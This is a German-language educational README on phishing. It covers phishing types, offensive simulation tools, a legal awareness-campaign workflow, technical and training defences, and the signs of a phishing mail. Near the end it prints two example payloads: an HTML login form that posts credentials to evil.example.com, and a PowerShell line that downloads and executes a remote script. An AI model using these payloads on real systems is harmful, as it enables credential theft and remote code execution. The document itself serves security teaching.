# 🎣 Phishing – Social Engineering im Cyberspace

## 🔍 Was ist Phishing?

**Phishing** ist eine Form des Social Engineerings, bei der Angreifer versuchen, sensible Informationen wie Zugangsdaten, Kreditkarteninformationen oder vertrauliche Unternehmensdaten durch Täuschung zu erlangen. Dies geschieht meist über gefälschte E-Mails, Webseiten oder Nachrichten, die von legitimen Quellen zu stammen scheinen.

---

## 🧠 Warum ist Phishing gefährlich?

- Keine technische Schwachstelle notwendig – der Mensch ist das Ziel
- Sehr hohe Erfolgsquote bei ungeschulten Nutzern
- Einstiegspunkt für weitere Angriffe (z. B. Ransomware, interne Pivoting-Angriffe)
- Auch technische Fachkräfte sind nicht immun

---

## 🎯 Typen von Phishing

| Typ                 | Beschreibung |
|---------------------|--------------|
| **Spear Phishing**  | Gezielte Angriffe auf bestimmte Personen, z. B. CFO, Admin |
| **Whaling**         | Hochrangige Zielpersonen (z. B. CEO, Vorstände) |
| **Clone Phishing**  | Duplikation legitimer E-Mails mit schädlichem Link/Anhang |
| **Voice Phishing (Vishing)** | Phishing über Telefonanrufe |
| **SMS Phishing (Smishing)** | Täuschung über SMS/WhatsApp-Nachrichten |
| **Pharming**        | Weiterleitung des Opfers über manipulierte DNS-Einträge |
| **Credential Harvesting** | Abgreifen von Zugangsdaten über gefälschte Login-Seiten |

---

## 🛠️ Tools & Frameworks

### ⚙️ Offensive Tools (nur zu Bildungszwecken!)

| Tool                 | Beschreibung |
|----------------------|--------------|
| **GoPhish**          | Open-Source Phishing Framework für Kampagnen |
| **SET (Social-Engineer Toolkit)** | Sammlung von Angriffsmethoden inkl. Mail- und Web-Phishing |
| **King Phisher**     | Phishing-Simulation mit E-Mail-Tracking |
| **Evilginx2**        | Man-in-the-middle Phishing mit 2FA-Bypass |
| **Modlishka**        | Reverse Proxy Phishing Tool |
| **Phishery**         | Word-Dokumente mit eingebetteten Login-Prompts |
| **Blackeye / Zphisher** | Templates für bekannte Login-Seiten (nur mit Zustimmung erlaubt!) |

---

## 🧪 Phishing-Kampagnen simulieren (Legal!)

### 🔐 Legal Compliance beachten
- Nur in Testumgebungen oder mit Zustimmung aller Beteiligten
- Für Awareness-Trainings & Security Audits
- DSGVO-konform planen und dokumentieren

### 📧 Beispielhafte Simulationskampagne
1. Zielgruppe auswählen (z. B. bestimmte Abteilung)
2. E-Mail-Typ auswählen (z. B. Paketdienst, Microsoft-Login, Urlaubsantrag)
3. Landing Page imitieren (z. B. Office365)
4. Tracking aktivieren (z. B. Klicks, Eingaben, Reaktionen)
5. Reporting & Schulung bereitstellen

---

## 🛡️ Schutzmaßnahmen gegen Phishing

### 🚫 Technische Maßnahmen
- SPF, DKIM, DMARC korrekt konfigurieren
- E-Mail-Gateway mit Phishing-Filter
- Browser-Warnungen aktivieren (z. B. Google Safe Browsing)
- 2FA/MFA verpflichtend einsetzen

### 🧠 Awareness & Schulung
- Regelmäßige Trainings für Mitarbeiter:innen
- Simulierte Phishing-Kampagnen
- Wiederholende Reminder („Nicht auf alles klicken“)

### 🔐 Weitere Maßnahmen
- Passwortmanager verwenden
- Kein „Passwort-Recycling“
- Prüfung der URL vor Eingabe von Login-Daten
- Anti-Phishing-Banner in E-Mails einbinden

---

## 🧾 Typische Merkmale einer Phishing-Mail

- Dringlichkeit („Ihr Konto wird gelöscht!“)
- Schlechte Grammatik / Übersetzung
- Absenderadresse gefälscht
- Linktext ≠ Ziel-URL
- Ungewöhnliche Anhänge (z. B. .iso, .lnk, .html)
- Emotionale Trigger (z. B. Angst, Belohnung)

---

## 🔬 Beispielhafte Payloads & Angriffsformen

```html
<!-- Gefälschte Login-Seite (Credential Harvesting) -->
<form action="http://evil.example.com/login" method="post">
  <input type="text" name="username" />
  <input type="password" name="password" />
</form>
```

```powershell
# Phishing-Anhang per PowerShell
IEX (New-Object Net.WebClient).DownloadString("http://evil.example.com/payload.ps1")
```

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---


## 📚 Nützliche Quellen & Lernmaterialien
- [GoPhish Project](https://github.com/gophish/gophish)
- [SET – Social Engineer Toolkit](https://github.com/trustedsec/social-engineer-toolkit)
- [Modlishka](https://github.com/drk1wi/Modlishka)

